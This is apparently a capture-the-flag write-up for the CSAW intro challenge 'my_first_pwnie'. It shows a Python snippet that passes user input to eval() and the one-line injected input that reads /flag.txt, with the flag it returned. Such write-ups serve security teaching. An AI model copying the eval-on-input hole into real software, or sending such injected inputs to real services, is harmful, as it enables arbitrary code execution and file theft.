# my_first_pwnie
## Category: Intro
## Author: ElykDeer

# Description

>You must be this 👉 high to ride.
>Note: flag is in /flag.txt

# Solution

We are given a python file and netcat credentials to a server running the code.
Besides some comments in the file, we have this code:

>try:
>  response = eval(input("What's the password? "))
>  print(f"You entered `{response}`")
>  if response == "password":
>    print("Yay! Correct! Congrats!")
>    quit()
>except:
>  pass
>
>print("Nay, that's not it.")
 

In one of the comments, we are being told to execute arbitrary commands.      
What immidiatly comes to mind when reading the code, is the eval() function. This allows us to use a one-liner to get the flag.
The goal of our one-liner is to read /flag.txt.

After quite some tries of experimenting, I finally got the flag, by inputing:

>print(open('/flag.txt', 'r').read())

Explanation: This is a compacter version of the "usual" way to read a file in python:

>with open('/flag.txt', 'r') as file:
>       content = file.read()
>       print(content)

After using the one-liner, part of the output is the flag:

>csawctf{neigh______}

# Flag

>csawctf{neigh______}

